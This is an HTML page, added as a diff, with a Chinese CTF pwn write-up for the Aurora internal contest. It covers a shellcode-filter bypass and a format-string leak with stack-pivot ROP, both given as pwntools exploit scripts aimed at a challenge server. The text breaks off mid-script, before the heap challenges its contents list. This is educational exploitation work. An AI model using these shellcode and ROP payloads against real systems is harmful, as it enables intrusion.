@@ -1,0 +1,1054 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
+    
+    
+      
+        <title>Aurora内部赛pwn writeup</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.30686662.css">
+      
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#face-wall-project" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href=".." title="My Docs" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              My Docs
+            </span>
+            <span class="md-header-nav__topic">
+              
+                Aurora内部赛pwn writeup
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href=".." title="My Docs" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href=".." title="Welcome to MkDocs" class="md-nav__link">
+      Welcome to MkDocs
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Aurora内部赛pwn writeup
+      </label>
+    
+    <a href="./" title="Aurora内部赛pwn writeup" class="md-nav__link md-nav__link--active">
+      Aurora内部赛pwn writeup
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#face-wall-project" class="md-nav__link">
+    face wall project
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    exp:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#baby-stack" class="md-nav__link">
+    baby stack
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec_1" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ida-f5" class="md-nav__link">
+    IDA F5分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#baby-heap" class="md-nav__link">
+    baby heap
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec_2" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ida-f5_1" class="md-nav__link">
+    IDA F5分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_2" class="md-nav__link">
+    exp：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#child-heap" class="md-nav__link">
+    child heap
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec_3" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ida-f5ida" class="md-nav__link">
+    IDA F5分析（本题IDA分析文件也在链接中）
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_3" class="md-nav__link">
+    exp:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../pragyan-ctf2019-pwn部分wp/" title="pragyan ctf2019 pwn部分wp" class="md-nav__link">
+      pragyan ctf2019 pwn部分wp
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../浅谈glibc-unlink/" title="浅谈glibc-unlink" class="md-nav__link">
+      浅谈glibc-unlink
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../西湖论剑pwn部分writeup/" title="西湖论剑pwn部分writeup" class="md-nav__link">
+      西湖论剑pwn部分writeup
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../通过DDCTF两道逆向题练习脱壳/" title="通过DDCTF两道逆向题练习脱壳" class="md-nav__link">
+      通过DDCTF两道逆向题练习脱壳
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#face-wall-project" class="md-nav__link">
+    face wall project
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    exp:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#baby-stack" class="md-nav__link">
+    baby stack
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec_1" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ida-f5" class="md-nav__link">
+    IDA F5分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#baby-heap" class="md-nav__link">
+    baby heap
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec_2" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ida-f5_1" class="md-nav__link">
+    IDA F5分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_2" class="md-nav__link">
+    exp：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#child-heap" class="md-nav__link">
+    child heap
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checksec_3" class="md-nav__link">
+    checksec分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ida-f5ida" class="md-nav__link">
+    IDA F5分析（本题IDA分析文件也在链接中）
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    解题思路：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_3" class="md-nav__link">
+    exp:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>Aurora内部赛pwn writeup</h1>
+                
+                <p>所有题目和源文件：<a href="https://github.com/CP32/ctf-pwn/tree/master/2019Aurora%E5%86%85%E9%83%A8%E8%B5%9B">链接</a></p>
+<h2 id="face-wall-project">face wall project<a class="headerlink" href="#face-wall-project" title="Permanent link">&para;</a></h2>
+<h5 id="checksec">checksec分析<a class="headerlink" href="#checksec" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span>[*] &#39;/home/ljb/ctf/aurora/face_wall_project/break_the_wall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+</pre></div>
+
+<p>除了PIE开启，其他全关</p>
+<!--more-->
+
+<p>IDA打开，F5，发现如下报错。找到那一行，发现是调用了buf的指令，理解之后把那一行nop掉，再F5，就能正常分析了。</p>
+<p><img alt="" src="https://github.com/CP32/ctf-pwn/blob/master/2019Aurora%E5%86%85%E9%83%A8%E8%B5%9B/face%20wall%201.jpg?raw=true" /></p>
+<p>分析发现是读入30字节的数据。</p>
+<ol>
+<li>用strlen判断数据长度要大于29，即长度要等于30，所以不能有0截断。</li>
+<li>检查数据中是否有\x90，所以不能有nop指令。</li>
+<li>一个xor函数，把奇数位数据进行异或得到a，然后把偶数位数据进行异或得到b，比较a和b是否相同，如果相同则执行数据。</li>
+</ol>
+<h5 id="_1">解题思路：<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h5>
+<p>显然是要我们传入shellcode从而执行shellcode。要求长度为30，且不能用nop指令填充，因此最好的办法是把一些无关指令重复执行。又因为xor函数的校验，我们需要让shellcode长度为29，最后进行计算填充第30位，从而绕过xor的检查。</p>
+<h5 id="exp">exp:<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;break_the_wall&quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+<span class="c1">#io=remote(&quot;123.207.32.26&quot;,9004)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="c1">#libc=ELF(&quot;&quot;)</span>
+<span class="c1">#context.log_level=&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">bits</span><span class="o">=</span><span class="mi">64</span>
+
+<span class="n">sla</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span>
+<span class="n">sl</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span>
+<span class="n">sa</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span>
+<span class="n">ru</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span>
+<span class="n">shell</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span>
+
+<span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;xor rsi,rsi&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;xor rdx,rdx&#39;</span><span class="p">)</span><span class="c1">#execve第二个参数rsi，第三个参数rdx置0</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;xor rax,rax&#39;</span><span class="p">)</span><span class="c1">#系统调用rax位清0.</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;push rax&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;push rax&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;push rax&#39;</span><span class="p">)</span><span class="c1">#填充使得shellcode为29位。同时因为rax=0，可以达到对&#39;//bin/sh&#39;0截断的效果</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov rbx,0x68732f2f6e69622f&#39;</span><span class="p">)</span><span class="c1">#&#39;//bin/sh&#39;</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;push rbx&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;push rsp&#39;</span><span class="p">)</span><span class="c1">#rsp是&#39;//bin/sh&#39;的地址</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov al,0x3b&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;syscall&#39;</span><span class="p">)</span><span class="c1">#execve(&#39;//bin/sh&#39;,0,0)</span>
+<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="c1">#另一种写法</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">shellcode=asm(&#39;xor rsi,rsi&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;xor rdx,rdx&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;xor rax,rax&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;push rax&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;push rax&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;mov rbx,0x68732f2f6e69622f&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;push rbx&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;mov rdi,rsp&#39;)#变动在这里，直接把rsp放到rdi</span>
+<span class="sd">shellcode+=asm(&#39;mov al,0x3b&#39;)</span>
+<span class="sd">shellcode+=asm(&#39;syscall&#39;)</span>
+<span class="sd">print len(shellcode)</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="c1">#xor校验</span>
+<span class="n">temp</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
+    <span class="n">temp</span><span class="o">^=</span><span class="nb">ord</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="p">])</span>
+
+<span class="n">temp1</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">temp</span><span class="o">^=</span><span class="nb">ord</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="n">shellcode</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">temp</span><span class="o">^</span><span class="n">temp1</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">sa</span><span class="p">(</span><span class="s1">&#39;ask?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">()</span>
+</pre></div>
+
+<p>flag:</p>
+<p><img alt="" src="https://github.com/CP32/ctf-pwn/blob/master/2019Aurora%E5%86%85%E9%83%A8%E8%B5%9B/face%20wall%20project/cat%20flag.jpg?raw=true" /></p>
+<p>PS：本题原型DEFCON QUALIFIER 2019 SPEED RUN 003，主要是对xor函数做了小改动。</p>
+<p>PPS：本题彩蛋：《三体》-面壁计划</p>
+<h3 id="baby-stack">baby stack<a class="headerlink" href="#baby-stack" title="Permanent link">&para;</a></h3>
+<h5 id="checksec_1">checksec分析<a class="headerlink" href="#checksec_1" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span>[*] &#39;/home/ljb/ctf/aurora/exam/exam&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</pre></div>
+
+<p>只有canary被关闭，其他防护全开</p>
+<h5 id="ida-f5">IDA F5分析<a class="headerlink" href="#ida-f5" title="Permanent link">&para;</a></h5>
+<p>主要功能：</p>
+<ol>
+<li>readQuestion，没用，3个puts输出固定字符串。</li>
+<li>writeAnswer，读入0x80个字节，存在0x10个字节栈溢出，同时会把读入数据复制一份到bss段中的answersheet。</li>
+<li>askTeacher，存在格式化字符串漏洞</li>
+<li>takeAnap，sleep两小时。。。</li>
+<li>backdoor，不能直接调用，需要传一个参数。参数等于30，且全局变量point=666，即可得到flag。</li>
+</ol>
+<h5 id="_2">解题思路：<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h5>
+<p>由于开了PIE，因此leak需要通过格式化字符串。又由于执行backdoor需要参数，因此至少需要0x20（ebp+pop_rdi+30+backdoor）个字节的栈溢出才能构造ROP链。由此想到可以通过栈迁移来达成。</p>
+<p>栈迁移首先需要找<code>leave;ret;</code>。这次从题目文件中找，由于开了PIE，所以我们需要leak出PIE。经过测试，直接栈迁移到answersheet中，在执行过程中会把GOT表破坏掉从而报错。因此我们考虑把栈迁移到栈中，即writeAnswer中读入数据存的地方。所以我们还需要leak出栈地址。</p>
+<p>之后构造ROP链，有两种方法。一种是先用格式化字符串改了point全局变量，接着调用backdoor函数。另一种是通过ret2libc，先leak出libc函数的地址再调用system('/bin/sh')</p>
+<h5 id="exp_1">exp:<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;exam&quot;</span><span class="p">)</span>
+<span class="c1">#io=elf.process()</span>
+<span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;123.207.32.26&quot;</span><span class="p">,</span><span class="mi">9002</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="c1">#libc=ELF(&quot;&quot;)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+
+<span class="n">sla</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span>
+<span class="n">sl</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span>
+<span class="n">sa</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span>
+<span class="n">ru</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span>
+<span class="n">shell</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span>
+
+<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;room&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s2">&quot;paper:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s2">&quot;[Y/N]</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ask</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s2">&quot;question?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">csu_init</span><span class="o">=</span><span class="mh">0x15f0</span>
+<span class="n">backdoor</span><span class="o">=</span><span class="mh">0x11c5</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x4040</span>
+<span class="n">leave_ret</span><span class="o">=</span><span class="mh">0x12c5</span><span class="c1">#ROPgadget --binary exam --only &#39;leave|ret&#39;</span>
+<span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x164b</span><span class="c1">#ROPgadget --binary exam --only &#39;pop|ret&#39;|grep rdi</span>
+<span class="n">point</span><span class="o">=</span><span class="mh">0x4014</span>
+
+<span class="c1">#gdb.attach(io)</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;%24$paaa%13$pbbb%19$pccc%20$pddd&#39;</span>
+<span class="n">ask</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">&quot;is : &quot;</span><span class="p">)</span>
+<span class="c1">#leak PIE</span>
+<span class="n">csu_init_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s2">&quot;aaa&quot;</span><span class="p">,</span><span class="bp">True</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">pie</span><span class="o">=</span><span class="n">csu_init_addr</span><span class="o">-</span><span class="n">csu_init</span>
+<span class="k">print</span> <span class="s2">&quot;pie:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie</span><span class="p">)</span>
+
+<span class="c1">#leak libc</span>
+<span class="n">puts_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s2">&quot;bbb&quot;</span><span class="p">,</span><span class="bp">True</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">puts_addr</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="mi">362</span>
+<span class="n">libcbase</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="k">print</span> <span class="s2">&quot;libcbase:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">libcbase</span>
+
+<span class="c1">#leak canary</span>
+<span class="n">canary</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;ccc&#39;</span><span class="p">,</span><span class="bp">True</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span> <span class="s1">&#39;canary:&#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+
+<span class="c1">#leak stack</span>
+<span class="n">target</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s1">&#39;ddd&#39;</span><span class="p">,</span><span class="bp">True</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">target</span><span class="o">-=</span><span class="mh">0x90</span><span class="c1">#这里需要gdb调试观察</span>
+<span class="k">print</span> <span class="s1">&#39;target:&#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+
+<span class="c1">#1:stack pivot+ret2libc</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">payload=p64(1)</span>
+<span class="sd">payload+=p64(pie+pop_rdi)</span>
+<span class="sd">payload+=p64(libc.search(&#39;/bin/sh&#39;).next())</span>
+<span class="sd">payload+=p64(libc.sym[&#39;system&#39;])</span>
+<span class="sd">payload+=&#39;\x90&#39;*(0x68-len(payload))</span>
+<span class="sd">payload+=p64(canary)</span>
+<span class="sd">payload+=p64(target)</span>
+<span class="sd">payload+=p64(pie+leave_ret)</span>
+<span class="sd">write(payload)</span>
+<span class="sd">shell()</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">#2:fmtstr+stack pivot+backdoor</span>
+<span class="sd">payload=&#39;%666c%8$hn&#39;</span>
+<span class="sd">payload+=(16-len(payload))*&#39;a&#39;</span>
+<span class="sd">payload+=p64(pie+point)</span>
+<span class="sd">ask(payload)</span>
+<span class="sd">payload=p64(1)</span>
+<span class="sd">payload+=p64(pie+pop_rdi)</span>
+<span class="sd">payload+=p64(30)</span>
+<span class="sd">payload+=p64(pie+backdoor)</span>
+<span class="sd">payload+=&#39;\x90&#39;*(0x68-len(payload))</span>
+<span class="sd">payload+=p64(canary)</span>
+<span class="sd">payload+=p64(target)</span>
+<span class="sd">payload+=p64(pie+leave_ret)</span>
+<span class="sd">write(payload)</span>
+<span class="sd">print io.recv()</span>
